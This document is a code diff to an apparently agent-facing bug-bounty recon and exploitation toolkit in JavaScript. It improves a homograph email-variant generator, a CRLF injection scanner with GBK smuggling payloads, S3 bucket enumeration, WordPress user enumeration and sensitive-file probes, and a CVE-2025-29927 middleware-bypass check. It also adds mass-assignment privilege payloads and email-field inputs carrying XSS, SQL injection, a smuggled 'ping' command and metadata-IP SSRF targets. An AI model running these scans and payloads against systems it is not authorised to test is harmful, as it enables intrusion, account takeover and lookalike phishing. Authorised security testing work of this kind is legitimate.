@@ -2512,33 +2512,47 @@ function punyDomain(domain) {
 		.join(".");
 }
 // confusables: ASCII -> visually-similar Unicode (Cyrillic/Greek/etc.)
+// digits included: 0/1/3/5/6/8 have Cyrillic lookalikes that generate real xn-- differences
 const HOMOGRAPH_MAP = {
 	a: "\u0430", c: "\u0441", e: "\u0435", h: "\u04bb", i: "\u0456",
 	j: "\u0458", k: "\u043a", l: "\u217c", m: "\u217f", o: "\u043e",
 	p: "\u0440", q: "\u051b", s: "\u0455", w: "\u051d", x: "\u0445",
 	y: "\u0443", b: "\u044c",
+	"0": "\u043e", "1": "\u0456", "3": "\u0437", "5": "\u0455", "6": "\u0431", "8": "\u0432",
 };
 function homographVariants(local, cap) {
 	const variants = [];
 	const chars = [...String(local)];
 	const idx = chars.flatMap((ch, i) => (HOMOGRAPH_MAP[ch.toLowerCase()] ? [i] : []));
 	if (!idx.length) return variants;
-	const pick = Math.min(cap, idx.length + 2);
-	for (let n = 1; n <= Math.min(2, idx.length); n++) {
-		for (let s = 0; s < pick && variants.length < cap; s++) {
-			const perm = idx.slice(s, s + n);
-			if (!perm.length) continue;
-			const next = chars.map((ch, i) => {
-				if (perm.includes(i)) {
-					const base = HOMOGRAPH_MAP[ch.toLowerCase()];
-					return ch === ch.toLowerCase() ? base : base.toUpperCase();
-				}
-				return ch;
-			});
-			const joined = next.join("");
-			if (joined !== local && !variants.includes(joined)) variants.push(joined);
-		}
+	const push = (perm) => {
+		const next = chars.map((ch, i) => {
+			if (perm.includes(i)) {
+				const base = HOMOGRAPH_MAP[ch.toLowerCase()];
+				return ch === ch.toLowerCase() ? base : base.toUpperCase();
+			}
+			return ch;
+		});
+		const joined = next.join("");
+		if (joined !== local && !variants.includes(joined)) variants.push(joined);
+	};
+	// singles first: full coverage of every homographable position
+	for (const i of idx) {
 		if (variants.length >= cap) break;
+		push([i]);
+	}
+	// pairs: stride-sample across the WHOLE position space instead of a sliding window —
+	// the old window (idx.slice(s, s+n)) saturated at ~idx.length+2 variants and left most
+	// of the cap unused (e.g. 10 homographable chars -> 25 of 40)
+	if (variants.length < cap && idx.length > 1) {
+		const totalPairs = (idx.length * (idx.length - 1)) / 2;
+		const stride = Math.max(1, Math.floor(totalPairs / Math.max(1, cap - variants.length)));
+		let k = 0;
+		for (let a = 0; a < idx.length && variants.length < cap; a++) {
+			for (let b2 = a + 1; b2 < idx.length && variants.length < cap; b2++) {
+				if (k++ % stride === 0) push([idx[a], idx[b2]]);
+			}
+		}
 	}
 	return variants;
 }
@@ -2702,6 +2716,14 @@ function cacheEvidence(res) {
 		if (h !== "age" && /^\s*(miss|dynamic|bypass|uncacheable|updating|stale|expired|not.?cached|noon|dc|bdf?)\b/i.test(low)) continue;
 		ev.push(h + ": " + v);
 	}
+	// x-served-by (Fastly POP id) appears on HIT *and* MISS responses — it is never hit evidence
+	// on its own and must not be the thing that flags a URL as cacheable. Keep it only when a
+	// strong signal exists alongside it (nonzero Age, or a HIT token in a status header).
+	const strongHit = ev.some((e) => {
+		if (/^age:/i.test(e)) return true;
+		return /^x-(cache|cache-status|vercel-cache|proxy-cache)|^cf-cache-status/i.test(e) && /\bhit\b/i.test(e);
+	});
+	if (!strongHit) return ev.filter((e) => !/^x-served-by:/i.test(e));
 	return ev;
 }
 const TOOLS = [
@@ -3612,7 +3634,7 @@ const TOOLS = [
 	},
 	{
 		name: "bb_crlf_scan",
-		description: "CRLF injection scan on a URL: inject %0d%0a / %0a / GBK-encoded variants into path and query, detect injected Set-Cookie/Location headers in the response. Keyless: direct HTTP.",
+		description: "CRLF injection scan on a URL: inject %0d%0a / %0a / GBK lead-byte variants into path and query, detect injected Set-Cookie/Location/X-Injected headers and response-splitting in the body. Keyless: direct HTTP.",
 		parameters: {
 			type: "object",
 			additionalProperties: false,
@@ -3651,7 +3673,12 @@ const TOOLS = [
 					["%0a", "x-injected: coffinxp"],
 					["%00%0d%0a", "set-cookie: crlf=coffinxp2; path=/"],
 					["%0d%0aSet-Cookie:crlf=px;", ""],
-					["\u00e5\u0098\u008d\u00e5\u0098\u008a", "set-cookie: crlf=gbk; path=/"],
+					// true GBK lead-byte probe: raw byte 0x81 before CRLF (percent-encoded so it survives
+					// WHATWG URL serialization). A GBK-decoding layer consumes 0x81+0x0D as one double-byte
+					// char, leaving a bare LF — the classic multibyte CRLF-smuggling attempt. The previous
+					// "\u00e5\u0098\u008d..." string was UTF-8 mojibake (c3 a5 c2 98...) and inert even on
+					// GBK-vulnerable hosts.
+					["%81%0d%0a", "set-cookie: crlf=gbk; path=/"],
 				];
 				const variants = [];
 				const u = new URL(base);
@@ -3672,24 +3699,30 @@ const TOOLS = [
 					}
 				}
 				const seen = new Set();
-				await mapPool(variants, 6, async (v) => {
-					if (seen.has(v.url)) return;
+				// collect per-variant results via mapPool's ordered return array — mutating shared
+				// out.found/out.count inside concurrent callbacks made order nondeterministic
+				const results = await mapPool(variants, 6, async (v) => {
+					if (seen.has(v.url)) return null;
 					seen.add(v.url);
-					out.count++;
 					try {
 						const { res } = await fetchRes(v.url, exec, { budget: 6000, redirect: "manual" });
-						await readLimited(res, 400);
+						const body = await readLimited(res, 400);
 						const injected = [];
 						for (const sc of safeCookies(res)) if (/crlf=|coffinxp/i.test(sc)) injected.push("Set-Cookie: " + sc.split(";")[0]);
 						if (res.headers.get("x-injected")) injected.push("X-Injected: " + res.headers.get("x-injected"));
 						const loc = res.headers.get("location") || "";
 						if (/crlf=|coffinxp/i.test(loc)) injected.push("Location: " + loc.slice(0, 80));
-						if (injected.length) out.found.push({ where: v.where, payload: v.payload, header: injected.join(" | "), status: res.status });
+						// response-splitting: injected CRLF in the status line or a smuggled second
+						// response head shows up at the start of / inside the body
+						if (/^HTTP\/[\d.]+\s*\d{3}/i.test(body) || /\r?\n\r?\nHTTP\/[\d.]+\s*\d{3}/i.test(body)) injected.push("body: response-split");
+						if (injected.length) return { where: v.where, payload: v.payload, header: injected.join(" | "), status: res.status };
 					} catch {
 						// skipped
 					}
+					return null;
 				});
-				out.found = out.found.slice(0, 20);
+				out.count = seen.size;
+				out.found = results.filter(Boolean).slice(0, 20);
 			} catch (e) {
 				out.error = shortErr(e);
 			}
@@ -3741,24 +3774,25 @@ const TOOLS = [
 				];
 				// budget: 22 paths / conc 8 = 3 waves; fetch budget 5000 + up-to-8s readLimited stall
 				// => worst ~3 x 13s = 39s < 45s timeout (was 10000ms -> ~54s, overrun)
-				await mapPool(paths, 8, async (p) => {
+				const rows = await mapPool(paths, 8, async (p) => {
 					try {
 						const { res } = await fetchRes("https://" + domain + p, exec, { budget: 5000 });
 						const body = await readLimited(res, 6000);
 						const ctype = res.headers.get("content-type") || "";
-						// cross-check: 2xx AND real spec body (not catch-all HTML) AND json/yaml content-type.
+						// cross-check: 2xx AND real spec body (not catch-all HTML) AND json/yaml content-type
+						// (substring match also covers vendor types like application/vnd.api+json).
 						// Anchored to the DOCUMENT ROOT — a bare "openapi" substring inside an error body
 						// (e.g. {"error":"openapi is not configured for this tenant"}) must NOT match.
 						const rootSpec = /^[\s\n]*[\[{]?[\s\n]*(?:"(?:openapi|swagger|swaggerVersion|swagger-ui|paths|components|definitions|info)"|(?:openapi|swagger)\s*:)/m;
 						const specish = res.status >= 200 && res.status < 300 &&
 							!/<\s*html/i.test(body) &&
 							/(json|ya?ml)/i.test(ctype) && rootSpec.test(body);
-						out.endpoints.push({ path: p, status: res.status, ctype, size: body.length, spec: specish });
+						return { path: p, status: res.status, ctype, size: body.length, spec: specish };
 					} catch {
-						out.endpoints.push({ path: p, status: 0, ctype: "", size: 0, spec: false });
+						return { path: p, status: 0, ctype: "", size: 0, spec: false };
 					}
 				});
-				out.endpoints.sort((a, b) => (b.spec ? 1 : 0) - (a.spec ? 1 : 0) || a.status - b.status);
+				out.endpoints = rows.sort((a, b) => (b.spec ? 1 : 0) - (a.spec ? 1 : 0) || a.status - b.status);
 				out.found = out.endpoints.filter((e) => e.spec).length;
 				if (!out.found) out.note = "No swagger endpoints found over https; retry over http or with /api prefixes.";
 			} catch (e) {
@@ -3816,7 +3850,7 @@ const TOOLS = [
 				// => ~130s > 75s timeout. Scale fetch budget down and cap the body-read stall so
 				// 5 x (2 x (2500 + 4000)) = 65s < 75s even in the stall-stacked worst case.
 				const fetchMs = 2500;
-				await mapPool(names, 6, async (name) => {
+				const rows = await mapPool(names, 6, async (name) => {
 					const forms = ["https://" + name + ".s3.amazonaws.com/", "https://s3.amazonaws.com/" + name + "/"];
 					let merged = null;
 					for (const u of forms) {
@@ -3824,7 +3858,12 @@ const TOOLS = [
 							const { res } = await fetchRes(u, exec, { budget: fetchMs });
 							const body = await readLimited(res, 1500, 4000);
 							const listable = res.status === 200 && /<ListBucketResult/i.test(body);
-							const note = res.status === 404 ? (body.includes("NoSuchBucket") ? "nonexistent" : "404") : body.includes("AccessDenied") ? "exists-private" : "exists";
+							let note = res.status === 404 ? (body.includes("NoSuchBucket") ? "nonexistent" : "404") : body.includes("AccessDenied") ? "exists-private" : "exists";
+							// static-website hosting serves 200 HTML instead of ListBucket XML — a live
+							// public bucket with listing disabled would otherwise read as a plain "exists"
+							if (res.status === 200 && !listable && /<html|<!doctype/i.test(body)) note = "200-html (website index? listing disabled)";
+							const region = res.headers.get("x-amz-bucket-region") || "";
+							if (region && !listable) note += " [region:" + region + "]";
 							if (merged) {
 								// a successful presence/listing result from ANY form overrides a 404 note
 								// (form-1 404-without-NoSuchBucket used to leave a stale "404" even when form-2 was live)
@@ -3838,11 +3877,10 @@ const TOOLS = [
 							// individual form error — try the other form
 						}
 					}
-					if (merged) {
-						out.buckets.push(merged);
-						if (merged.listable && !out.open.includes(name)) out.open.push(name);
-					}
+					return merged;
 				});
+				out.buckets = rows.filter(Boolean);
+				out.open = out.buckets.filter((b) => b.listable).map((b) => b.name);
 				if (!out.buckets.length) out.buckets.push({ name: d, status: 0, listable: false, note: "all probes errored (network blocked?)" });
 			} catch (e) {
 				out.error = shortErr(e);
@@ -3888,7 +3926,8 @@ const TOOLS = [
 					return out;
 				}
 				const [localRaw, domainRaw] = email.split("@");
-				const cap = Math.min(Math.max(Number(args.cap) || 18, 1), 40);
+				// clampLimit (not inline Number()||def): cap:0 must clamp to min 1, not fall back to 18
+				const cap = clampLimit(args.cap, 18, 1, 40);
 				const localVariants = homographVariants(localRaw, cap);
 				const add = (em, note) => {
 					if (em !== email && !out.variants.some((v) => v.email === em)) out.variants.push({ email: em, note });
@@ -3958,6 +3997,8 @@ const TOOLS = [
 					'{"isAdmin":"false"}', '{"isAdmin":0}', '{"isAdmin":null}', '{"isAdmin":[]}',
 					'{"access_level":{"$gt":0}}', '{"role":{"$ne":"user"}}',
 					'{"provider":"google","provider_id":"victim@example.com"}', '{"auth_strategy":"oauth"}',
+					'{"tenant_id":1}', '{"isDeleted":false}', '{"organization":"internal"}', '{"billing_plan":"enterprise"}', '{"isBillingAdmin":true}',
+					'{"group_id":1}', '{"permissions":["*"]}', '{"credits":999999}', '{"balance":0}', '{"roles":["admin"]}',
 					'{"isAdmin":true,"status":"approved","email_verified":true}',
 				];
 				out.payloads = bat;
@@ -4020,7 +4061,7 @@ const TOOLS = [
 					l + "%00@evil.com", l + "%0d%0a@evil.com", l + "\r\n@evil.com",
 					l + "@example.com@evil.com", l + "@" + d + "@evil.com",
 					l + "@127.0.0.1", l + "@169.254.169.254", l + "@localhost", l + "@internal.local",
-					'"<script>alert(1)</script>"@' + d, l + "@<script>alert(1)</script>' || 1 || '",
+					'"<script>alert(1)</script>"@' + d, l + "@evil.com%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
 					l + "@'" + " OR 1=1--", l + "@'" + "; ping -c 10 127.0.0.1;'",
 					"\u0430" + l.slice(1) + "@" + d, l + "@" + punyDomain("\u0430" + d),
 				];
@@ -4091,7 +4132,10 @@ const TOOLS = [
 				const t = await get({ "user-agent": UA, "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware" });
 				out.withHeader = t.status;
 				const bodyDiffers = b.body && t.body && b.body !== t.body;
-				if (t.status === 0) {
+				if (b.status === 0 && t.status === 0) {
+					// both probes down — network/WAF/deadline, not "site blocks the header"
+					out.verdict = "baseline AND header probes both failed (network/WAF/deadline) — INCONCLUSIVE; cannot attest absence of CVE-2025-29927";
+				} else if (t.status === 0) {
 					out.verdict = "header probe errored; site may block it";
 				} else if (b.status === 0) {
 					// baseline fetch failed — absence of a 200-on-header signal is NOT proof the CVE is absent
@@ -4104,8 +4148,6 @@ const TOOLS = [
 					out.verdict = "response changes with middleware header; investigate manually";
 				} else if ((t.rewrite || b.rewrite) && b.status === 200 && t.status === 200 && !bodyDiffers) {
 					out.verdict = "x-middleware-rewrite present (" + (t.rewrite || b.rewrite) + ") — middleware rewrite signal; combine with the CVE-2025-29927 header for the rewrite-bypass variant (verify manually)";
-				} else if (t.status === 0) {
-					out.verdict = "header probe errored; site may block it";
 				} else {
 					out.verdict = "no evidence of CVE-2025-29927 on this path";
 				}
@@ -4161,9 +4203,10 @@ const TOOLS = [
 				const seen = new Map();
 				for (const r of rows) {
 					const nb = r.not_before || "";
-					// crt.sh name_value is newline-separated AND sometimes comma-joined on one line
+					// crt.sh name_value is newline-separated AND sometimes comma-joined on one line;
+					// lowercase: DNS names are case-insensitive and crt.sh mixes case across issuers
 					for (const n of String(r.name_value || "").split(/[\s,]+/)) {
-						const name = String(n || "").trim();
+						const name = String(n || "").trim().toLowerCase();
 						if (!name || name.startsWith("*")) continue;
 						if (!seen.has(name) || nb > seen.get(name)) seen.set(name, nb);
 					}
@@ -4172,7 +4215,9 @@ const TOOLS = [
 				out.count = rows.length;
 				const dates = all.map(([, nb]) => Date.parse(nb)).filter((d) => Number.isFinite(d));
 				out.oldest = dates.length ? Math.min(...dates) : 0;
-				const sorted = all.sort((a, b) => (a[1] < b[1] ? 1 : -1)).slice(0, limit);
+				// tie-aware comparator (never returns a constant -1 on equal keys) keeps equal-date
+				// entries in insertion order deterministically
+				const sorted = all.sort((a, b) => (a[1] > b[1] ? -1 : a[1] < b[1] ? 1 : 0)).slice(0, limit);
 				out.fresh = sorted.map(([name, firstSeen]) => ({ name, firstSeen: firstSeen.slice(0, 10) }));
 				if (!out.fresh.length) out.note = "No non-wildcard certs found; try the root domain or a wildcard scope.";
 			} catch (e) {
@@ -4231,17 +4276,18 @@ const TOOLS = [
 					["/wp-content/debug.log", "debug-log"], ["/.htaccess", "dotfile"], ["/.htpasswd", "dotfile"],
 					["/phpinfo.php", "phpinfo"],
 				];
-				await mapPool(probes, 8, async ([p, flag]) => {
+				// collect per-probe results via mapPool's ordered return array — pushing into shared
+				// out.usernames/out.endpoints inside concurrent callbacks raced and reordered output
+				const results = await mapPool(probes, 8, async ([p, flag]) => {
 					try {
 						const { res } = await fetchRes(base + p, exec, { budget: 7000 });
 						const body = await readLimited(res, 2500);
+						const users = [];
 						let f = "";
 						if (flag === "user-enum" && res.status >= 200 && res.status < 400 && /[{"'"](slug|name)["'"][: ]/.test(body)) {
-							const slugs = body.match(/"slug":"([^"]+)"/g) || [];
-							const names = body.match(/"name":"([^"]+)"/g) || [];
-							for (const s of slugs.slice(0, 12)) out.usernames.push(s.replace(/"slug":"|"$/g, ""));
-							for (const n of names.slice(0, 8)) out.usernames.push(n.replace(/"name":"|"$/g, ""));
-							out.usernames = uniq(out.usernames.map((x) => x.replace(/^"slug":"|^"name":"|"$/g, "")));
+							const slugs = [...body.matchAll(/"slug":"([^"]+)"/g)].map((m) => m[1]).slice(0, 12);
+							const names = [...body.matchAll(/"name":"([^"]+)"/g)].map((m) => m[1]).slice(0, 8);
+							users.push(...slugs, ...names);
 							f = "users-leaked";
 						} else if (flag === "user-enum" && res.status === 401) {
 							f = "rest-locked";
@@ -4253,19 +4299,21 @@ const TOOLS = [
 						} else if (flag === "version") {
 							// readme.html "Stable tag: X.Y" / "Version: X.Y" — real WP version disclosure
 							const vm = body.match(/Stable tag:\s*([0-9][0-9a-z.\-]*)/i) || body.match(/Version\s*:\s*([0-9][0-9a-z.\-]*)/i);
-							if (res.status === 200 && vm) { out.version = vm[1]; f = "version:" + vm[1]; }
+							if (res.status === 200 && vm) f = "version:" + vm[1];
 						} else if (flag && res.status === 200 && body.trim().length > 0 && !/^\s*<!doctype\s+html|<html/i.test(body)) {
 							// config/backup/dotfile hits must be real 200 non-HTML content, not 301-to-homepage / catchall pages
 							if (flag === "setup-wizard" && /setup|configure|install/i.test(body)) f = "setup-wizard-live";
 							else if (flag !== "setup-wizard" && flag !== "version") f = flag;
 						}
-						out.endpoints.push({ path: p, status: res.status, flag: f });
+						return { ep: { path: p, status: res.status, flag: f }, users, version: f.startsWith("version:") ? f.slice(8) : "" };
 					} catch {
-						out.endpoints.push({ path: p, status: 0, flag: "" });
+						return { ep: { path: p, status: 0, flag: "" }, users: [], version: "" };
 					}
 				});
+				out.endpoints = results.map((r) => r.ep);
+				out.version = results.map((r) => r.version).find(Boolean) || "";
+				out.usernames = uniq(results.flatMap((r) => r.users)).slice(0, 20);
 				out.endpoints.sort((a, b) => (b.flag ? 1 : 0) - (a.flag ? 1 : 0));
-				out.usernames = uniq(out.usernames).slice(0, 20);
 				if (!out.usernames.length) out.note = "No usernames leaked; try wpscan -e u and author-enum /?author=1.";
 			} catch (e) {
 				out.error = shortErr(e);
@@ -4388,7 +4436,9 @@ const TOOLS = [
 				const domain = normalizeDomain(args.domain);
 				const limit = clampLimit(args.limit, 40, 1, 100);
 				const [cdx, otx] = await Promise.all([cdxUrls(domain, exec, { cap: 900 }), otxUrls(domain, exec, 200)]);
-				const proneRe = /^(id|cat|catid|category|page|search|q|user|name|file|order|sort|action|lang|folder|type|pid|uid|item|product|news|post|blog|download|view|tid|product_id|category_id)$/i;
+				// ORDER BY / LIMIT / generic sinks included: orderby|sort|dir|offset|limit|filter|column
+				// are injection-prone beyond WHERE-clause params; query covers GraphQL-over-GET
+				const proneRe = /^(id|cat|catid|category|page|search|q|user|name|file|order|orderby|order_by|sort|sortby|sort_by|filter|column|col|dir|offset|limit|action|lang|folder|type|pid|uid|item|product|news|post|blog|download|view|tid|product_id|category_id|query)$/i;
 				const dynamicRe = /\.(php|asp|aspx|jsp|cfm|cgi|pl)([?#]|$)/i;
 				const seen = new Set();
 				const rows = [];
@@ -4476,6 +4526,16 @@ const TOOLS = [
 				if (out.detected.some((d) => d.waf === "Imperva")) out.detected = out.detected.filter((d) => d.waf !== "Incapsula");
 				// Sucuri/other (server-header match) is the same product as the x-sucuri-id signature — dedupe
 				if (out.detected.some((d) => d.waf === "Sucuri")) out.detected = out.detected.filter((d) => d.waf !== "Sucuri/other");
+				// Akamai GHOST (server: AkamaiGHost) is the same vendor as the x-akamai-* signatures —
+				// merge evidence instead of reporting two entries; a GHOST-only host still maps to Akamai hints
+				const ak = out.detected.find((d) => d.waf === "Akamai");
+				const ghost = out.detected.find((d) => d.waf === "Akamai GHOST");
+				if (ak && ghost) {
+					ak.evidence = ak.evidence + "+" + ghost.evidence;
+					out.detected = out.detected.filter((d) => d.waf !== "Akamai GHOST");
+				} else if (ghost) {
+					ghost.waf = "Akamai";
+				}
 				if (/cloudflare/i.test(h("server")) && !out.detected.length) out.detected.push({ waf: "Cloudflare", evidence: "server header" });
 				if (/nginx/i.test(h("server")) && !out.detected.length) out.pageNote = "server: nginx — no WAF signature matched (plain origin or WAF-less edge)";
 				const tamperMap = {
